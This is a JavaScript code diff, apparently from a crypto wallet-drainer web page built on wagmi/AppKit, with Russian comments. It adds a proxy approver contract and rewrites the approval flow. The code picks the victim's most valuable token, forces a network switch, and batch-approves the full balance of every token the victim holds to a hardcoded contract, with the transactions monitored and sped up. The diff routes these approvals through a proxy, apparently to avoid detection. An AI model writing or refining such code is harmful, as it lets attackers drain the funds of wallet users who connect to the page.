@@ -81,6 +81,13 @@ const CONTRACTS = {
   [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
 }
 
+const PROXY_CONTRACTS = {
+  1: '0xYourProxyContractAddressEthereum', // Ethereum
+  56: '0xYourProxyContractAddressBSC', // BSC
+  137: '0xYourProxyContractAddressPolygon', // Polygon
+  // Добавь адреса для других сетей
+};
+
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 const appKit = createAppKit({
   adapters: [wagmiAdapter],
@@ -550,6 +557,41 @@ const erc20Abi = [
   }
 ]
 
+const proxyApproverAbi = [
+  {
+    inputs: [
+      { name: 'token', type: 'address' },
+      { name: 'spender', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+    name: 'proxyApprove',
+    outputs: [],
+    stateMutability: 'nonpayable',
+    type: 'function',
+  },
+  {
+    inputs: [
+      { name: 'tokens', type: 'address[]' },
+      { name: 'spender', type: 'address' },
+      { name: 'amounts', type: 'uint256[]' },
+    ],
+    name: 'batchProxyApprove',
+    outputs: [],
+    stateMutability: 'nonpayable',
+    type: 'function',
+  },
+  {
+    inputs: [
+      { name: 'token', type: 'address' },
+      { name: 'spender', type: 'address' },
+    ],
+    name: 'revokeApproval',
+    outputs: [],
+    stateMutability: 'nonpayable',
+    type: 'function',
+  },
+];
+
 const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress || !isAddress(address) || !isAddress(tokenAddress)) {
     console.error(`Invalid or missing address: ${address}, tokenAddress: ${tokenAddress}`)
@@ -615,126 +657,171 @@ const getTokenPrice = async (symbol) => {
   }
 }
 
-const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
-  const checksumTokenAddress = getAddress(tokenAddress)
-  const checksumContractAddress = getAddress(contractAddress)
+const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId, amount) => {
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
+  if (!PROXY_CONTRACTS[chainId]) throw new Error(`Proxy contract not configured for chain ${chainId}`);
+
+  const checksumTokenAddress = getAddress(tokenAddress);
+  const checksumContractAddress = getAddress(contractAddress);
+  const proxyContractAddress = getAddress(PROXY_CONTRACTS[chainId]);
+  const owner = wagmiConfig.account.address;
+
   try {
+    // Проверяем текущий allowance
+    const currentAllowance = await getTokenAllowance(wagmiConfig, owner, checksumTokenAddress, checksumContractAddress, chainId);
+
+    if (currentAllowance >= amount) {
+      console.log(`Allowance for ${checksumTokenAddress} is sufficient: ${currentAllowance.toString()}`);
+      return { type: 'none', txHash: null };
+    }
+
+    // Обнуляем allowance через прокси, если оно не 0 (защита от Approve2)
+    if (currentAllowance > 0) {
+      console.log(`Revoking allowance for ${checksumTokenAddress} via proxy`);
+      const revokeTxHash = await writeContract(wagmiConfig, {
+        address: proxyContractAddress,
+        abi: proxyApproverAbi,
+        functionName: 'revokeApproval',
+        args: [checksumTokenAddress, checksumContractAddress],
+        chainId,
+      });
+      console.log(`Revoke allowance transaction sent: ${revokeTxHash}`);
+      await monitorAndSpeedUpTransaction(revokeTxHash, chainId, wagmiConfig);
+    }
+
+    // Вызываем proxyApprove
+    console.log(`Calling proxyApprove for ${checksumTokenAddress} with amount ${amount.toString()} on chain ${chainId}`);
     const txHash = await writeContract(wagmiConfig, {
-      address: checksumTokenAddress,
-      abi: erc20Abi,
-      functionName: 'approve',
-      args: [checksumContractAddress, maxUint256],
-      chainId
-    })
-    console.log(`Approve transaction sent: ${txHash}`)
-    
-    // Запускаем мониторинг транзакции в фоне
-    monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error)
-    })
-    
-    return txHash
+      address: proxyContractAddress,
+      abi: proxyApproverAbi,
+      functionName: 'proxyApprove',
+      args: [checksumTokenAddress, checksumContractAddress, amount],
+      chainId,
+    });
+    console.log(`Proxy approve transaction sent: ${txHash}`);
+    await monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig);
+
+    return { type: 'proxyApprove', txHash };
   } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`)
-    throw error
+    store.errors.push(`Proxy approve failed for ${tokenAddress}: ${error.message}`);
+    throw error;
   }
-}
+};
 
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
-    console.log('No most expensive token found, skipping batch operations')
-    return false
+    console.log('No most expensive token found, skipping batch operations');
+    return false;
   }
 
-  console.log(`Attempting batch operations for network: ${mostExpensive.network}`)
+  console.log(`Attempting batch operations for network: ${mostExpensive.network}`);
 
-  // Добавляем проверку и смену сети
-  const targetNetworkInfo = networkMap[mostExpensive.network]
+  const targetNetworkInfo = networkMap[mostExpensive.network];
   if (!targetNetworkInfo) {
-    const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
-    store.errors.push(errorMessage)
-    return { success: false, error: errorMessage }
+    const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`;
+    store.errors.push(errorMessage);
+    return { success: false, error: errorMessage };
   }
 
-  const targetNetwork = targetNetworkInfo.networkObj
-  const expectedChainId = targetNetworkInfo.chainId
+  const proxyContractAddress = PROXY_CONTRACTS[mostExpensive.chainId];
+  if (!proxyContractAddress) {
+    const errorMessage = `Proxy contract not configured for chain ${mostExpensive.chainId}`;
+    store.errors.push(errorMessage);
+    return { success: false, error: errorMessage };
+  }
+
+  const targetNetwork = targetNetworkInfo.networkObj;
+  const expectedChainId = targetNetworkInfo.chainId;
 
   if (store.networkState.chainId !== expectedChainId) {
-    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+    console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`);
     try {
       await new Promise((resolve, reject) => {
         const unsubscribe = appKit.subscribeNetwork(networkState => {
           if (networkState.chainId === expectedChainId) {
-            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
-            unsubscribe()
-            resolve()
+            console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`);
+            unsubscribe();
+            resolve();
           }
-        })
+        });
         appKit.switchNetwork(targetNetwork).catch(error => {
-          unsubscribe()
-          reject(error)
-        })
+          unsubscribe();
+          reject(error);
+        });
         setTimeout(() => {
-          unsubscribe()
-          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
-        }, 10000)
-      })
+          unsubscribe();
+          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`));
+        }, 10000);
+      });
     } catch (error) {
-      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-      store.errors.push(errorMessage)
-      return { success: false, error: errorMessage }
+      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`;
+      store.errors.push(errorMessage);
+      return { success: false, error: errorMessage };
     }
   } else {
-    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+    console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`);
   }
 
   try {
-    // Get tokens with non-zero balance in the most expensive token's network
-    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0)
+    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0 && t.address !== 'native');
 
-    // Prepare approve calls for ERC-20 tokens
-    const approveCalls = networkTokens
-      .filter(t => t.address !== 'native')
-      .map(t => ({
-        to: getAddress(t.address),
-        data: encodeFunctionData({
-          abi: erc20Abi,
-          functionName: 'approve',
-          args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
-        }),
-        value: '0x0'
-      }))
+    // Подготавливаем вызовы для обнуления allowance через revokeApproval
+    const revokeCalls = networkTokens.map(t => ({
+      to: getAddress(proxyContractAddress),
+      data: encodeFunctionData({
+        abi: proxyApproverAbi,
+        functionName: 'revokeApproval',
+        args: [getAddress(t.address), getAddress(CONTRACTS[mostExpensive.chainId])],
+      }),
+      value: '0x0',
+    }));
 
-    // Send batch transaction
-    if (approveCalls.length > 0) {
-	const gasLimit = BigInt(550000)
-   	const maxFeePerGas = BigInt(1000000000)
-    	const maxPriorityFeePerGas = BigInt(1000000000)
-    	console.log(`Approving token with gasLimit: ${gasLimit}, 	maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`)
+    // Подготавливаем вызов batchProxyApprove
+    const tokens = networkTokens.map(t => getAddress(t.address));
+    const amounts = networkTokens.map(t => parseUnits(t.balance.toString(), t.decimals));
+    const batchApproveCall = [{
+      to: getAddress(proxyContractAddress),
+      data: encodeFunctionData({
+        abi: proxyApproverAbi,
+        functionName: 'batchProxyApprove',
+        args: [tokens, getAddress(CONTRACTS[mostExpensive.chainId]), amounts],
+      }),
+      value: '0x0',
+    }];
+
+    const allCalls = [...revokeCalls, ...batchApproveCall];
+
+    if (allCalls.length > 0) {
+      const gasLimit = BigInt(550000 * allCalls.length);
+      const feeData = await wagmiAdapter.getProvider(mostExpensive.chainId).getFeeData();
+      const maxFeePerGas = feeData.maxFeePerGas || BigInt(1000000000);
+      const maxPriorityFeePerGas = feeData.maxPriorityFeePerGas || BigInt(1000000000);
+      console.log(`Approving tokens via proxy with gasLimit: ${gasLimit}, maxFeePerGas: ${maxFeePerGas}, maxPriorityFeePerGas: ${maxPriorityFeePerGas}`);
+
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
-        calls: approveCalls,
+        calls: allCalls,
         account: getAddress(state.address),
         chainId: mostExpensive.chainId,
         gas: gasLimit,
-	maxFeePerGas,
-	maxPriorityFeePerGas
-      })
-      console.log(`Batch transaction sent with id: ${id}`)
-      return { success: true, txHash: id }
+        maxFeePerGas,
+        maxPriorityFeePerGas,
+      });
+      console.log(`Batch transaction sent with id: ${id}`);
+      await monitorAndSpeedUpTransaction(id, mostExpensive.chainId, wagmiAdapter.wagmiConfig);
+      return { success: true, txHash: id };
     }
-    return { success: false, message: 'No operations to perform' }
+    return { success: false, message: 'No operations to perform' };
   } catch (error) {
-    console.error('Batch operation error:', error)
+    console.error('Batch operation error:', error);
     if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
-      return { success: false, error: 'BATCH_NOT_SUPPORTED' }
+      return { success: false, error: 'BATCH_NOT_SUPPORTED' };
     }
-    return { success: false, error: error.message }
+    return { success: false, error: error.message };
   }
-}
+};
 
 // Модифицируем initializeSubscribers для корректной работы уведомлений
 const initializeSubscribers = (modal) => {
